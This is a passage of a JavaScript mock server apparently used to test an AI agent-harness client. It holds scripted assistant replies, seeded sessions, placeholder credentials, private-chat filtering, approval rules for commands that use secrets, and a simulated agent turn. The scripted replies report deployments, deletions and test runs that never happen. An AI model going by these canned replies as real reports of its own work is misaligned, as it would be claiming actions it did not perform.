**Change** in \`crates/server/src/ws.rs\`:

- \`RecvError::Lagged\` now sends a warning notice and keeps the socket open; the client resyncs with \`get_session { since_seq }\`
- \`RecvError::Closed\` ends the loop cleanly instead of bubbling up as an error

~~~rust
Err(broadcast::error::RecvError::Lagged(missed)) => {
    tracing::warn!(%device, missed, "event receiver lagged; client will resync");
    send_json(&mut socket, &ServerMessage::Event { event: notice }).await?;
}
~~~

I haven't run the tests yet. Want me to run \`cargo test -p tessera-server\` and add a regression test that forces a lag with a tiny channel?`;
const ERROR_ANSWER = md`
## One failing test: \`store::tests::since_seq_returns_tail\`

The command exited with code **101** (cargo's "tests failed" status). 11 of 12 tests pass; the failure is an off-by-one:

- the test appends entries 1 to 6 and asks for everything after \`seq = 4\`
- it expects \`[5, 6]\` but got \`[4, 5, 6]\`

So the query is inclusive. In \`crates/core/src/store.rs\` the SQL uses \`seq >= ?2\`, while the protocol says entries **after** \`since_seq\`:

~~~rust
// before
"SELECT body FROM entries WHERE session_id = ?1 AND seq >= ?2 ORDER BY seq"
// after
"SELECT body FROM entries WHERE session_id = ?1 AND seq > ?2 ORDER BY seq"
~~~

This matters beyond the test: every reconnecting client receives its last entry twice. Clients dedupe by \`seq\`, so nobody noticed, but it's wasted bandwidth and a latent bug. Shall I make the one-character fix and re-run the suite?`;
function approvalAnswer(deploy, denied) {
  if (deploy && denied) return 'OK, not deploying. Nothing was built or uploaded. When you are ready, `./scripts/deploy.sh staging --dry-run` shows exactly what would change without touching the server.';
  if (deploy) return md`
Deployed **0.1.0** to staging in 38s.

- Health check passed (\`/api/health\` reports protocol 1)
- The previous release is kept on the host; roll back with \`./scripts/deploy.sh staging --rollback\`

I didn't touch production. Want me to watch the staging logs for a few minutes before you promote it?`;
  if (denied) return "Understood: I left `build/` and `dist/` untouched. If disk space is the concern, `cargo sweep --time 14` removes only build artifacts older than two weeks, which is much gentler.";
  return md`
Done. \`build/\` and \`dist/\` are gone (about 1.2 GB freed).

Both are regenerated by \`npm run build\` and \`cargo build\`, so nothing was lost. If disk space keeps being a problem, \`cargo sweep --time 14\` removes only artifacts older than two weeks.`;
}

const STREAM_THINKING = `The user wants to watch a long answer stream in. Plan: take a baseline with the workspace tests so the tool card shows live output, then write a structured explanation of the streaming path.

What matters for the explanation:
1. The server emits stream_delta events per chunk; the client appends to the part at that index.
2. The transcript follows the tail only while the reader is at the bottom; scrolling up detaches.
3. Tool output arrives as tool_output chunks and is tailed live.
4. Tiles can be resized mid-stream; the scroller must re-pin when its own size changes.

Keep paragraphs short. Include a table of the event types and a small code sample for the client-side follow logic.`;

const STREAM_ANSWER = md`
## How a reply streams, end to end

Here's what happens between the model producing a token and the pixel appearing in your tile.

### 1. The server fans out deltas

Every chunk the provider sends becomes a \`stream_delta\` event. Deltas carry an **index** (which part of the message they extend) and a **kind** — thinking, text or a tool call's arguments. Nothing is buffered on the way: the first token reaches the socket within a few milliseconds.

### 2. The client appends, it never re-renders the world

The store appends each delta to the right part in place. The transcript re-renders markdown at most once per frame, so even nine tiles streaming at once stay smooth. Syntax highlighting waits until a block settles.

### 3. Following the tail

The view stays glued to the bottom **only while you're there**. A \`ResizeObserver\` on the transcript content fires whenever anything grows — text, thinking, tool output, a late image — and snaps the scroll position to the end without animating, so it never lags behind.

~~~ts
const ro = new ResizeObserver(() => {
  if (pinned) scroller.scrollTop = scroller.scrollHeight;
});
ro.observe(content);
~~~

Scroll up with the wheel, a finger, the keyboard or the scrollbar and you're detached: a **Jump to latest** pill counts what's new. Come back down and it re-attaches by itself.

### 4. Events at a glance

| Event | Carries | What you see |
| --- | --- | --- |
| \`stream_started\` | model, speaker | The chat is working (a quiet status line, no text yet) |
| \`stream_delta\` (thinking) | reasoning text | the live thinking window |
| \`stream_delta\` (text) | answer text | the reply, fading in |
| \`tool_started\` / \`tool_output\` | name, output chunks | a tool card with a live tail |
| \`entry_added\` | the finished message | the step collapses into the timeline |

### 5. Resizing mid-stream

Dragging a divider changes the transcript's own height, not its content. A second observer watches the scroller itself, so a tile that shrinks while text pours in keeps its last line in view.

### 6. Why it feels calm

- One activity line says what's happening now ("Running cargo test · 12s").
- Thinking shows only its latest lines while live, then folds into "Thought for 8s".
- Finished steps become a single line with a timeline behind it.

That's the whole path. Scroll up at any point to check the behaviour — the pill will tell you how much you've missed.
`;

const LONG_ANSWER = md`
# Designing reconnect-safe streaming

You asked for the long version, so here is the whole picture: how a client stays consistent with the agent harness across flaky networks, sleeping phones and server restarts, and what each side has to guarantee for that to work.

## 1. Two kinds of data

Everything the server sends falls into one of two buckets:

- **Persisted history**: \`Entry\` values with a per-session \`seq\`. They are durable, ordered and replayable.
- **Ephemeral progress**: stream deltas, tool output chunks and status changes. Useful while you're watching, worthless afterwards.

The whole design follows from treating these differently. History must never be lost or duplicated. Progress can be dropped at any time, as long as the client can rebuild the *current* state with a single request.

## 2. Sequence numbers do the heavy lifting

Each session has a strictly increasing \`seq\`. The client remembers the highest one it has rendered, and after any reconnect it asks for everything after it:

~~~ts
async function resync(sessionId: string, lastSeq: number) {
  const snap = await rpc("get_session", { session_id: sessionId, since_seq: lastSeq });
  for (const entry of snap.entries) store.append(sessionId, entry);
  store.setStreaming(sessionId, snap.streaming ?? null);
  store.setApprovals(sessionId, snap.approvals);
  store.setQueued(sessionId, snap.queued);
}
~~~

Two properties make this safe:

1. **Appends are idempotent on the client.** If an \`entry_added\` event and the snapshot both contain seq 42, the second copy is ignored.
2. **Streaming state is replaced, not merged.** The snapshot's \`streaming\` field is the authoritative in-progress message, so the client throws away whatever partial deltas it had.

The second rule is what lets the server drop deltas freely. A client that missed half a paragraph doesn't need to know which half; it just takes the snapshot.

## 3. What the server has to guarantee

The server side is short but strict:

- Assign \`seq\` and persist the entry **before** broadcasting \`entry_added\`.
- Emit \`stream_ended\` before the final \`entry_added\` of that message, so clients can swap the streaming bubble for the persisted entry without a flicker.
- Never reuse or reorder sequence numbers, even across restarts. The store is the source of truth, not an in-memory counter.
- Keep the in-progress message (content so far plus running tool output) in memory so \`get_session\` can return it.

Here is the core of the broadcast path:

~~~rust
pub async fn append(&self, session: &SessionId, body: EntryBody) -> Result<Entry> {
    let entry = self.store.append(session, body).await?; // assigns seq, fsyncs
    self.events
        .send(Event::EntryAdded { session_id: session.to_string(), entry: entry.clone() })
        .ok(); // no receivers is fine
    Ok(entry)
}
~~~

Note the \`.ok()\` on the send. A broadcast channel with no receivers returns an error, and for us that is not a failure: the entry is already durable.

## 4. Backpressure and slow clients

A phone on a bad connection can fall behind a fast model. With a bounded broadcast channel the slow receiver eventually gets \`RecvError::Lagged(n)\`. The tempting fix is a bigger buffer; the right fix is to treat lag as a resync trigger:

~~~rust
match events.recv().await {
    Ok(event) => send_json(&mut socket, &ServerMessage::Event { event }).await?,
    Err(RecvError::Lagged(missed)) => {
        tracing::warn!(missed, "client lagged; asking it to resync");
        send_json(&mut socket, &resync_notice(missed)).await?;
    }
    Err(RecvError::Closed) => break,
}
~~~

The client sees the notice, calls \`get_session\` for its open sessions and carries on. Memory stays bounded no matter how slow the client is.

## 5. Reconnect policy on the client

Reconnection is where most bugs live, so keep the policy boring:

- Exponential backoff with full jitter, starting at 250 ms and capped at 10 s.
- Reset the backoff only after the connection has been **healthy for a few seconds**, not on the first successful handshake. Otherwise a server that accepts and immediately drops connections causes a tight loop.
- On every successful connect, send \`hello\` first, then resync every session the user has open.
- Try endpoints in order (LAN first, then remote) and remember which one worked.

~~~ts
function nextDelay(attempt: number): number {
  const cap = Math.min(10_000, 250 * 2 ** attempt);
  return Math.random() * cap; // full jitter
}
~~~

On mobile, also reconnect eagerly when the page becomes visible again. Background timers are throttled, and waiting for the backoff to fire after unlocking the phone feels broken.

## 6. Approvals and queued messages

Approvals and queued follow-ups are part of the snapshot for the same reason streaming is: they are state the user acts on, and acting on stale state is worse than not acting at all.

- If an approval was answered from another device while this one was offline, the snapshot simply won't list it any more, and the client should dismiss its prompt.
- Answering an approval that no longer exists returns \`not_found\`. Treat that as "someone else already decided", not as an error to show the user.
- Queued follow-ups belong to the session, not the device, so every client shows the same queue.

## 7. Server restarts

If the server restarts mid-turn, the in-memory streaming state is gone. The session comes back as \`interrupted\`, and the next user message resumes it. Tool calls whose outcome is unknown are reported to the model as uncertain rather than silently retried, because re-running \`git push\` or a database migration is never safe to assume.

## 8. Testing it

You can exercise almost all of this without a real network:

~~~sh
# drop every socket and watch clients resync
curl -X POST http://127.0.0.1:7878/__mock/drop

# then throttle to a slow 3G profile in devtools, send "demo",
# and lock/unlock the phone mid-stream
~~~

| Failure | What the client sees | Recovery |
|---|---|---|
| Socket dropped mid-stream | \`close\` event | Reconnect, \`get_session\` with \`since_seq\` |
| Client lagged | Warning notice | Resync open sessions |
| Server restarted | Session is \`interrupted\` | Next message resumes the turn |
| Approval answered elsewhere | Approval missing from snapshot | Dismiss the local prompt |
| Duplicate \`entry_added\` | Same \`seq\` twice | Ignore by \`seq\` |

## Summary

Persist first, broadcast second; number everything that matters; make streaming state replaceable; and treat every anomaly (lag, reconnect, restart) as "resync from the last known \`seq\`". With those four rules the client never needs to reason about *which* events it missed, only about where it left off.
`;

function defaultThinking(text, rec) {
  return `The user is asking: "${truncate(stripMarkdown(text), 90)}". The working directory is ${rec.info.cwd}. ` +
    'I should answer directly with a concrete example rather than a lecture, point out the one trade-off that matters, ' +
    'and offer to apply it instead of editing files unasked.';
}
function defaultAnswer(text, rec) {
  const q = truncate(stripMarkdown(text), 160);
  const cwd = rec.info.cwd;
  const base = path.posix.basename(cwd) || cwd;
  const variant = [...text].reduce((h, c) => (h * 31 + c.codePointAt(0)) >>> 0, 7) % 3;
  if (variant === 0) return md`
Here's how I'd approach it.

> ${q}

The short version: make the behaviour observable first, then change it. In \`${cwd}\` that means a focused test that fails today, a minimal change, and a full \`cargo test --workspace\` run before calling it done.

**Plan**

1. Reproduce it with a small test (or a script, if it isn't unit-testable)
2. Find the narrowest place to change, usually where data is parsed or state changes
3. Make the change, run the affected crate's tests, then the whole workspace
4. Record decisions in the task ledger so they survive compaction

~~~rust
#[tokio::test]
async fn reproduces_the_issue() {
    let harness = TestHarness::start().await;
    let session = harness.create_session().await;
    harness.send(&session, "hello").await;
    let snap = harness.get_session(&session, Some(0)).await;
    assert_eq!(snap.entries.first().map(|e| e.seq), Some(1));
}
~~~

Want me to go ahead in \`${base}\`? I'll run the tests afterwards and report back.`;
  if (variant === 1) return md`
Good question. It mostly depends on where the state should live, so here are the options against what you described (*"${q}"*):

| Option | Pros | Cons |
|---|---|---|
| Keep it in the component | Simple, local | Lost on remount |
| Lift it into the session store | Survives navigation, easy to test | A little more wiring |
| Derive it from the snapshot | Always consistent after reconnect | Needs a server round-trip |

I'd lift it into the store. Solid's fine-grained updates mean only the affected rows re-render:

~~~ts
const [state, setState] = createStore<{ drafts: Record<string, string> }>({ drafts: {} });

export function setDraft(sessionId: string, text: string) {
  setState("drafts", sessionId, text);
}
~~~

- Survives switching sessions and reconnects
- Nothing extra goes over the wire
- Testable without a DOM

Shall I wire it up in \`${base}\`?`;
  return md`
Let me break this down.

You wrote: *"${q}"*

**What's likely going on**

Most of the time this comes down to ordering: two things that look sequential are actually concurrent, and the rare interleaving is the one you're seeing. The fix is rarely more retries; it's making the dependency explicit.

**What I'd check, in order**

- Is anything shared across tasks without a lock or a channel?
- Does any code \`.await\` while holding a \`std::sync::Mutex\` guard?
- Are timeouts measured from the right point (request start vs. last byte)?
- Is there a test that runs the sequence 100 times with \`--test-threads=1\`?

~~~sh
cargo test -p tessera-core -- --test-threads=1 --nocapture 2>&1 | tee /tmp/run.log
rg -n "panicked|FAILED" /tmp/run.log
~~~

If you point me at the file you suspect, I'll read it and give you a concrete answer instead of a checklist.`;
}

function compactionSummary(rec, instructions) {
  const users = rec.entries.filter((e) => e.kind === 'user').map((e) => stripMarkdown(textOf(e.content))).filter(Boolean);
  const assistants = rec.entries.filter((e) => e.kind === 'assistant').length;
  const files = new Set();
  for (const e of rec.entries) {
    if (e.kind !== 'assistant') continue;
    for (const p of e.content) if (p.type === 'tool_call' && p.arguments?.path) files.add(p.arguments.path);
  }
  const lines = [
    '## Summary of earlier conversation', '',
    `**Goal:** ${truncate(users[0] ?? rec.info.title ?? 'n/a', 200)}`, '',
    `**Working directory:** \`${rec.info.cwd}\``, '',
    '**Progress so far**',
    `- ${users.length} user message${users.length === 1 ? '' : 's'} and ${assistants} assistant response${assistants === 1 ? '' : 's'} condensed`,
    `- Files touched: ${files.size ? [...files].map((f) => `\`${f}\``).join(', ') : 'none'}`,
    `- Most recent request: ${truncate(users.at(-1) ?? 'n/a', 200)}`, '',
    '**Keep in mind**',
    '- The task ledger is preserved verbatim and remains authoritative',
    '- Earlier tool output was dropped: re-read files before editing them',
  ];
  if (instructions) lines.push('', `**Focus requested:** ${instructions}`);
  return lines.join('\n');
}

// ─── state ──────────────────────────────────────────────────────────────────
let state;
const clients = new Set();          // open WsConn
const tokenDevices = new Map();     // token -> device id (from /api/pair)
const revokedTokens = new Set();
const miscTimers = new Set();       // OAuth completion etc.; cleared on reset
function later(ms, fn) {
  const t = setTimeout(() => { miscTimers.delete(t); fn(); }, ms);
  miscTimers.add(t);
  return t;
}
/** Stored secrets (values are write-only), as auth.rs keeps them. */
const seedSecrets = (t0) => new Map([
  ['GITHUB', {
    kind: 'login', value: '', description: 'GitHub', ask: true, hosts: ['github.com'], updated_at: t0 - 6 * DAY, last_used: t0 - 2 * HOUR,
    fields: { username: 'octo-user', password: 'mock-password', totp: 'JBSWY3DPEHPK3PXP' },
  }],
  ['OPENWEATHER_KEY', { kind: 'token', value: 'owm_mock', description: 'OpenWeather API', ask: false, hosts: [], fields: {}, updated_at: t0 - 2 * DAY }],
  ['STRIPE_TEST', {
    kind: 'custom', value: '', description: 'Stripe (test mode)', ask: true, hosts: ['api.stripe.com'], updated_at: t0 - 11 * DAY,
    fields: { api_key: 'sk_test_mock', webhook_secret: 'whsec_mock' },
  }],
  ['SWITCH_ADMIN', {
    kind: 'login', value: '', description: 'Homelab switches', ask: true, hosts: [], updated_at: t0 - 3 * DAY, last_used: t0 - 9 * HOUR,
    fields: { username: 'admin', password: 'mock-switch-pass' }, bots: [FORGE], on_server: false, on_machines: ['dev_desktop'],
  }],
]);
/** `fresh`: a first run (setup not completed, no default model, no provider signed in). */
function buildState(fresh = false) {
  const t0 = now();
  const providers = markFast(seedProviders());
  const bots = seedBots(t0);
  const sessions = new Map();
  for (const rec of seedSessions(t0, providers, bots)) {
    rec.info.thinking = snapThinking(rec.info.thinking, rec.info.model, providers);
    sessions.set(rec.info.id, rec);
  }
  for (const b of bots) if (b.thinking) b.thinking = snapThinking(b.thinking, b.model ?? { provider: 'anthropic', model: 'claude-sonnet-5-5' }, providers);
  const boards = new Map([['wb_seed7home', {
    id: 'wb_seed7home', session_id: 'ses_wb7c1e5a9f20', title: 'Home network', content: { type: 'html', html: TOPOLOGY_HTML },
    version: 1, created_at: t0 - 85 * MIN, updated_at: t0 - 85 * MIN, by_user: false,
  }]]);
  if (fresh) {
    for (const prov of providers) { prov.authenticated = false; delete prov.account; }
  }
  return {
    serverInfo: { name: 'tessera (mock)', version: VERSION, protocol: 1, home: HOME, default_model: fresh ? null : { provider: 'anthropic', model: 'claude-sonnet-5-5' }, voice: false, voice_engine: 'auto' },
    setupCompleted: !fresh,
    noLocalModels: false,
    lan: false, // the mock pretends to listen on this machine only (SetupStatus.lan, RemoteStatus.lan_urls)
    bind: '127.0.0.1:7878', // server.bind from the next start (set_server_bind); the mock never really rebinds
    boundAt: '127.0.0.1:7878',
    voice: { enabled: false, provider: 'local', base_url: '', model: '', language: '', has_key: false, engine: 'auto', keep_audio: false, server_model: 'auto', server_voice: '', openai_key: false, kept: 0, kept_bytes: 0,
      server: { state: 'missing', error: null, listen: false, speak: false, live: true, model: 'tiny', voice: 'en_US-lessac-medium', voices: [{ id: 'en_US-lessac-medium', label: 'English · Lessac', language: 'en', installed: false, size_bytes: 60000000 }], download_bytes: 100000000, done_bytes: 0, total_bytes: 0 } },
    voiceRequests: [],
    voiceKey: null,
    voiceSaveDelay: 0, // race fixture only: editing during a slow voice save
    remote: {
      urls: ['https://tessera.example.com'],
      headers: [['CF-Access-Client-Id', '8f2c1e0a9b7d4c3e.access'], ['CF-Access-Client-Secret', 'mock-5e1f9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b9c8d7e6f5a4b3c2d1e0f']],
      tunnel: null, // { hostname, tunnel_id } once cloudflare_setup succeeded
      web: { on: false, available: true, door: false }, // "Use Tessera in a web browser"; door: the tunnel's /web Access app
    },
    cloudflareBusy: false,
    webSearch: { search: 'duckduckgo', searxng_url: null, headers: new Map(), keys: new Map() }, // header and key values are write-only
    secrets: seedSecrets(t0),
    providers,
    providerKeys: new Map(fresh ? [] : [['anthropic', 'sk-ant-mock']]),
    oauthTimers: new Map(),
    sessions,
    bots,
    jobs: seedJobs(t0),
    memory: seedMemory(),
    skills: seedSkills(),
    devices: seedDevices(t0),
    pairingCodes: new Map(),
    mosaics: EMPTY_MOSAICS(),
    boards,                        // whiteboards by id
    boardTokens: new Map(),        // board id -> page token (board_link)
    boardAsks: new Map(),          // ask id -> { boardId, input, resolve(answer) }
    signatures: [],                // signatures "saved" by answered asks (for tests)
    answers: [],                   // every accepted answer_board (for tests)
    sends: [],                     // each `send`: was the chat's tile in the shared layout yet? (GET /__mock/sends)
    // Helpers working (`busy`, per chat in `chats`), the children waiting their turn, the default per chat
    // (`set_helpers` changes it, with steps and minutes) and the server's capacity.
    slots: { enabled: true, busy: 0, queue: [], max: MAX_SUBAGENTS, steps: 40, minutes: 15, capacity: HELPER_CAPACITY, chats: new Map() },
    uploads: new Map(),            // session id -> Set of saved attachment file names
    roles: new Map(),              // model roles other than default: name -> "provider/model" | "@role"
    smallModes: new Map(),         // small model mode set by the user: "provider/model" -> "on" | "off" (auto = absent)
    notes: new Map(),              // the notes library: id -> Note
    noteVersions: new Map(),       // id -> NoteVersion[] kept from before changes (newest first)
    noteAssets: new Map(),         // pictures in notes: name -> bytes (put_note_asset / read_note_asset)
    snapshotWaits: new Map(),      // board_snapshot_request id -> resolve(answer)
    snapshots: [],                 // every board_snapshot a device sent (for tests: GET /__mock/snapshots)
    appUpdate: null,               // synthetic server-offered setup; never executed
    appUpdateMode: 'normal',
  };
}
function resetState(fresh = false) {
  if (state) {
    for (const rec of state.sessions.values()) {
      rec.turn?.cancel();
      if (rec.compactTimer) clearTimeout(rec.compactTimer);
    }
  }
  for (const t of miscTimers) clearTimeout(t);
  miscTimers.clear();
  revokedTokens.clear();
  state = buildState(fresh);
}

/**
 * private.rs: a private chat stays on the device that made it. Every event naming it (its session, entries,
 * stream, approvals, notices, notifications, boards, files) goes to that device only; requests naming it from
 * another device fail as if it didn't exist; lists leave it out; signing the device out deletes it.
 */
const privateOwner = (id) => {
  const r = id ? state.sessions.get(id) : null;
  return r?.info.private ? r.owner : undefined;
};
const seesSession = (id, deviceId) => {
  const o = privateOwner(id);
  return o === undefined || o === deviceId;
};
const boardSession = (id) => (state.boards instanceof Map ? state.boards.get(id)?.session_id : undefined);
const eventSession = (e) => e.session?.id ?? e.session_id ?? e.notification?.session_id ?? e.board?.session_id ?? e.file?.session_id ?? (e.board_id ? boardSession(e.board_id) : null) ?? null;
/** The request names a session (or board) another device's private chat owns: not found. */
function privateGuard(params, conn) {
  const sid = typeof params.session_id === 'string' ? params.session_id : null;
  if (sid && !seesSession(sid, conn?.deviceId)) throw notFound(`no session \`${sid}\``);
  const bid = typeof params.board_id === 'string' ? params.board_id : null;
  if (bid && !seesSession(boardSession(bid), conn?.deviceId)) throw notFound(`no whiteboard \`${bid}\``);
}
/** Lists leave out other devices' private chats (and what belongs to them). */
function privateFilter(method, result, conn) {
  const mine = (sid) => !sid || seesSession(sid, conn?.deviceId);
  if (method === 'list_sessions' && Array.isArray(result)) return result.filter((i) => mine(i.id));
  if ((method === 'list_boards' || method === 'list_notifications') && Array.isArray(result)) return result.filter((x) => mine(x.session_id));
  if (method === 'pending_notifications' && result && typeof result === 'object')
    return { ...result, new: (result.new ?? []).filter((n) => mine(n.session_id)), waiting: (result.waiting ?? []).filter((w) => mine(w.session_id)) };
  return result;
}
function broadcast(event) {
  const data = Buffer.from(JSON.stringify({ event }));
  const sid = eventSession(event);
  for (const c of clients) if (!sid || seesSession(sid, c.deviceId)) c.sendRaw(data);
}
const emitSession = (rec) => broadcast({ type: 'session_updated', session: rec.info });
function setStatus(rec, status) {
  rec.info.status = status;
  emitSession(rec);
}
function addEntry(rec, body) {
  const entry = { seq: ++rec.seq, ts: now(), ...body };
  rec.entries.push(entry);
  const ctx = rec.info.context;
  rec.info.last_seq = entry.seq;
  rec.info.updated_at = entry.ts;
  ctx.tokens = Math.min(ctx.window, ctx.tokens + entryTokens(entry));
  broadcast({ type: 'entry_added', session_id: rec.info.id, entry });
  return entry;
}
function getRec(p) {
  const id = need(p, 'session_id');
  const rec = state.sessions.get(id);
  if (!rec) throw notFound(`Session not found: ${id}`);
  return rec;
}
function createSession({
  kind = 'chat', title = '', cwd = `${HOME}/projects/tessera`, model = null, permission = 'default', thinking = 'auto', bot_id, members = [],
  parent_id, private: priv = false, status = 'idle', role, owner,
} = {}) {
  // Under a private chat: private too, and that chat's device's (engine.rs create_session_ext).
  const parent = parent_id ? state.sessions.get(parent_id) : null;
  if (parent?.info.private) {
    priv = true;
    owner = parent.owner;
  }
  const t = now();
  const m = model ?? state.serverInfo.default_model ?? { provider: 'anthropic', model: 'claude-sonnet-5-5' };
  thinking = snapThinking(thinking, m);
  const info = {
    id: `ses_${hex(6)}`, title, kind, cwd, model: { provider: m.provider, model: m.model }, thinking, permission, status,
    ...(parent_id ? { parent_id } : {}), ...(bot_id ? { bot_id } : {}), ...(role ? { role } : {}), members: [...members],
    created_at: t, updated_at: t, last_seq: 0, usage: zeroUsage(),
    context: { tokens: BASE_CONTEXT, window: windowFor(m), compactions: 0 }, pinned: false, archived: false, preview: '',
    private: priv, steps: 0, fast: false,
  };
  const rec = newRecord(info);
  // private.rs: a private chat is the device's that made it (null: the mock itself, every device sees it).
  if (priv && owner) rec.owner = owner;
  state.sessions.set(info.id, rec);
  emitSession(rec);
  return rec;
}
/** What the user sees queued, in order (engine user_queue): sent now, steers, follow-ups; never harness notes. */
const userQueue = (rec) =>
  [rec.sendNow, rec.steers, rec.followups].flatMap((list) => list.filter((w) => !w.author).map((w) => ({ list, w })));
/** QueuedMessage[]: what is being sent now, the user's steers, then follow-ups (goals and reports never show). */
function queuedOf(rec) {
  return userQueue(rec).map(({ list, w }) => {
    // The whole of what they typed (editing starts from it); images and attached files counted.
    const typed = w.content.filter((c) => c.type === 'text' && !ATTACHED_RE.test(c.text));
    const attachments = w.content.length - typed.length - w.content.filter((c) => c.type === 'text' && /^\[Attached image: /.test(c.text)).length;
    return {
      text: textOf(typed), steer: list === rec.steers, ...(list === rec.sendNow ? { interrupt: true } : {}), attachments,
    };
  });
}
/** The `index`-th message the user sees queued (engine queued_target) and the list it is in. */
function queuedSlot(rec, index) {
  const all = userQueue(rec);
  if (!Number.isInteger(index) || index < 0 || index >= all.length) throw notFound('that message is no longer queued');
  return all[index];
}
const queuedTarget = (rec, index) => queuedSlot(rec, index).w;
const emitQueue = (rec) => broadcast({ type: 'queue_changed', session_id: rec.info.id, queued: queuedOf(rec) });
function snapshot(rec, since) {
  const entries = since == null ? rec.entries : rec.entries.filter((e) => e.seq > since);
  // engine.rs `subagents_of`: the chat's subagents as they are now (not the harness's helpers).
  const children = [...state.sessions.values()]
    .map((r) => r.info)
    .filter((i) => i.parent_id === rec.info.id && i.kind === 'subagent' && !i.internal)
    .sort((a, b) => a.created_at - b.created_at);
  return { history_revision: rec.historyRevision ?? 0, info: rec.info, entries, ...(rec.turn ? { streaming: rec.turn.streaming() } : {}), approvals: rec.approvals, queued: queuedOf(rec), children };
}

// ─── agent turn simulation ──────────────────────────────────────────────────
const CANCELLED = Symbol('cancelled');
const STEER_PAUSE = 1200; // ms a pending steer waits at a step boundary before it is injected
const MUTATING = new Set(['bash', 'edit', 'write']);
/** How the agent acknowledges what was injected at a step: the user's steers, a goal note, subagent reports. */
function steerAck(taken) {
  const texts = [], thoughts = [];
  const user = taken.filter((w) => !w.author);
  if (user.length) {
    const said = stripMarkdown(user.map((w) => ownText(w.content)).join(' / ')) || 'the file you sent';
    texts.push(`Got it — adjusting: ${truncate(said, 160)}`);
    thoughts.push(`The user steered mid-turn: "${truncate(said, 120)}". Acknowledge it and fold it into what I do next.`);
  }
  const goal = taken.findLast((w) => w.author === 'goal');
  if (goal) {
    const g = textOf(goal.content).split('\n').slice(1).join(' ').trim();
    texts.push(g ? `Noted the goal: ${truncate(g, 160)}` : 'Noted: the session goal is cleared.');
    thoughts.push(g ? `The user set the session goal: "${truncate(g, 120)}". Keep working towards it.` : 'The user cleared the session goal.');
  }
  const names = taken.filter((w) => w.author?.startsWith('subagent:'))
    .map((w) => textOf(w.content).match(/^\[Report from subagent "([^"]*)"/)?.[1] ?? 'a subagent');
  if (names.length) {
    texts.push(names.length === 1 ? `The report from "${names[0]}" just came in; I'll take it into account.`
      : `Reports from ${names.map((n) => `"${n}"`).join(' and ')} just came in; I'll take them into account.`);
    thoughts.push(`Subagent report(s) arrived mid-turn (${names.join(', ')}). Fold them in without derailing the current step.`);
  }
  return { text: texts.join(' '), thinking: thoughts.join(' ') };
}
const summarizeCall = (c) => (c.name === 'bash' ? c.args.command : c.args?.path ? `${c.name} ${c.args.path}` : c.name);
function approvalFor(rec, call) {
  const mode = rec.info.permission;
  // `always` (tools: Approve { always }) asks whatever the chat's mode.
  if (mode === 'auto' && !call.approval?.always) return null;
  let a = call.approval ?? null;
  if (!a && mode === 'ask' && MUTATING.has(call.name)) a = { summary: summarizeCall(call), reason: 'Permission mode is "ask": every mutating action needs approval' };
  // tools/bash.rs: a command naming a secret with `ask` is shown to the user first.
  // Listed bots use theirs without asking.
  const asks = call.name === 'bash' ? secretsUsedBy(call.args?.command, rec).filter(([, s]) => s.ask && !s.bots) : [];
  if (asks.length) {
    const list = asks.map(([n, s]) => (s.hosts.length ? `$${n} (for ${s.hosts.join(', ')})` : `$${n}`)).join(', ');
    const why = `This command uses ${list} from your passwords & keys.`;
    a = { summary: a?.summary ?? summarizeCall(call), reason: a ? `${a.reason} ${why}` : why };
  }
  if (a && rec.allowed.has(a.summary)) return null;
  return a;
}

class Turn {
  constructor(rec, onFinish) {
    this.rec = rec;
    this.sid = rec.info.id;
    this.onFinish = onFinish;
    this.cancelled = false;
    this.pending = new Set();        // outstanding waits { cleanup, reject }
    this.approvalWaiters = new Map(); // approval id -> resolve(decision)
    this.phase = 'idle';             // 'stream' while a model response streams, 'tools' afterwards
    this.model = { ...rec.info.model };
    // Bot chats, duties and DMs speak as the session's bot; rooms pass `author` per step.
    this.author = rec.info.bot_id && botById(rec.info.bot_id) ? rec.info.bot_id : undefined;
    this.speaker = this.author;      // author of the current/last step
    this.parts = [];                 // streaming parts: {type,text} | {type:'tool_call',id,name,buf}
    this.runningTools = [];          // RunningTool
    this.pendingCalls = [];          // calls of the current batch without a tool_result yet
    // Steers (and parked harness notes) live on the record: `rec.steers`, injected at the next step.
  }
  wait(setup) {
    return new Promise((resolve, reject) => {
      if (this.cancelled) return reject(CANCELLED);
      const w = { reject, cleanup: null };
      w.cleanup = setup((v) => { this.pending.delete(w); resolve(v); });
      this.pending.add(w);
    });
  }
  sleep(ms) {
    return this.wait((done) => { const t = setTimeout(done, ms); return () => clearTimeout(t); });
  }
  waitApproval(id) {
    return this.wait((done) => { this.approvalWaiters.set(id, done); return () => this.approvalWaiters.delete(id); });
  }
  resolveApproval(id, decision) {
    const done = this.approvalWaiters.get(id);
    this.approvalWaiters.delete(id);
    done?.(decision);
  }
  cancel() {
    this.cancelled = true;
    for (const w of this.pending) { w.cleanup?.(); w.reject(CANCELLED); }
    this.pending.clear();
  }
  streaming() {
    const content = this.phase !== 'stream' ? [] : this.parts.map((p) => {
      if (p.type !== 'tool_call') return { type: p.type, text: p.text };
      let args = {};
      try { args = JSON.parse(p.buf); } catch { /* incomplete */ }
      return { type: 'tool_call', id: p.id, name: p.name, arguments: args };
    });
    return { content, model: this.model, ...(this.speaker ? { author: this.speaker } : {}), running_tools: this.runningTools.map((r) => ({ ...r })) };
  }

  /**
   * One model response: stream_started → deltas → stream_ended → entry_added → tool calls.
   * `spec.author` / `spec.model` override the session's bot and model (room speakers).
   */
  async step(spec) {
    if (this.cancelled) throw CANCELLED;
    const rec = this.rec, sid = this.sid;
    let { thinking, text = '' } = spec;
    const author = spec.author ?? this.author;
    // A just-typed steer sits in the queue for a moment before the model "reads" it.
    if (rec.steers.some((w) => !w.author)) await this.sleep(STEER_PAUSE);
    if (rec.steers.length) {
      const taken = rec.steers.splice(0);
      for (const w of taken) addEntry(rec, { kind: 'user', content: w.content, ...(w.author ? { author: w.author } : {}) });
      rec.info.preview = computePreview(rec.entries);
      emitSession(rec);
      emitQueue(rec);
      const ack = steerAck(taken);
      text = [ack.text, text].filter(Boolean).join('\n\n');
      thinking = [ack.thinking, thinking].filter(Boolean).join(' ');
    }
    this.model = { ...(spec.model ?? rec.info.model) };
    this.speaker = author;
    this.phase = 'stream';
    this.parts = [];
    broadcast({ type: 'stream_started', session_id: sid, model: this.model, ...(author ? { author } : {}) });
    await this.sleep(randInt(200, 450));
    let index = 0;
    // `thoughts`: several reasoning parts, '' for one that only carries hidden reasoning (OpenAI-style),
    // null for an output item with nothing to show between them (the server keeps an empty text part
    // there; a device watching the stream sees a gap in the part numbers).
    const thoughts = spec.thoughts ?? (thinking ? [thinking] : []);
